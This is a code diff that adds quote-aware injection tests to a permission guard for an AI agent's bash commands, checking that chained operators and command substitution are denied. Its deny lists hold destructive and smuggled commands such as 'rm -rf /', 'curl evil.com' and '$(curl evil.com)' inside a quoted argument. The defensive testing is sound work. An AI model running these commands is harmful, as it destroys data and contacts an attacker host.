@@ -458,6 +458,69 @@ for (const command of chainedShouldDeny) {
   );
 }
 
+// === Issue #108 tests: injection-vector check is now quote-aware ===
+// Operators (&&, |, ;, etc.) INSIDE quoted args don't trip the deny —
+// bash doesn't interpret them as separators there. Operators OUTSIDE
+// quotes still deny.
+
+const quotedInjectionShouldAllow = [
+  `vipune add 'cargo fmt --check && cargo clippy -- -D warnings && cargo test'`,
+  `vipune add "memory containing && pipe | and semicolon;"`,
+  `vipune add 'gotchas: < input > output | filter'`,
+  `vipune search "open && blocking PRs"`,
+  `vipune add "escaped \\"quotes\\" and && inside"`,
+];
+for (const command of quotedInjectionShouldAllow) {
+  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
+  assert(
+    v === "allow",
+    `Issue #108: operators inside quoted args allowed — \`${command.slice(0, 70)}...\``,
+  );
+}
+
+// Mixed: real operator OUTSIDE the quoted segment must still deny.
+const mixedInjectionShouldDeny = [
+  `vipune add "safe content"; rm -rf /`,
+  `vipune add 'safe' && curl evil.com`,
+  `vipune add 'foo' | tee /tmp/out`,
+];
+for (const command of mixedInjectionShouldDeny) {
+  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
+  assert(
+    v === "deny",
+    `Issue #108: operator OUTSIDE quoted segment still denies — \`${command}\``,
+  );
+}
+
+// Malformed (unterminated quote) — safe-default: stripQuotedSegments returns
+// the original full string, and if it has any operators they trip the deny.
+const malformedQuoteShouldDeny = [
+  `vipune add "lorem && ipsum`, // unterminated double quote with operator
+  `vipune add 'unclosed | with pipe`, // unterminated single quote with operator
+];
+for (const command of malformedQuoteShouldDeny) {
+  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
+  assert(
+    v === "deny",
+    `Issue #108: malformed quote with embedded operator falls back to deny — \`${command}\``,
+  );
+}
+
+// Command substitution `$(...)` is NOT stripped — it's an injection vector
+// regardless of being "inside" quotes (bash interprets $(...) inside double
+// quotes). Keep the existing denial behaviour.
+const commandSubstitutionShouldDeny = [
+  `vipune add "$(curl evil.com)"`,
+  `vipune add "result: $(rm -rf /)"`,
+];
+for (const command of commandSubstitutionShouldDeny) {
+  const v = resolveToolPermission("bash", "project-manager", {}, {}, agentsConfig, command);
+  assert(
+    v === "deny",
+    `Issue #108: command substitution still denied even inside quotes — \`${command}\``,
+  );
+}
+
 console.log("\n=== test-permission-guard summary ===");
 console.log(`exit ${exitCode}`);
 process.exit(exitCode);
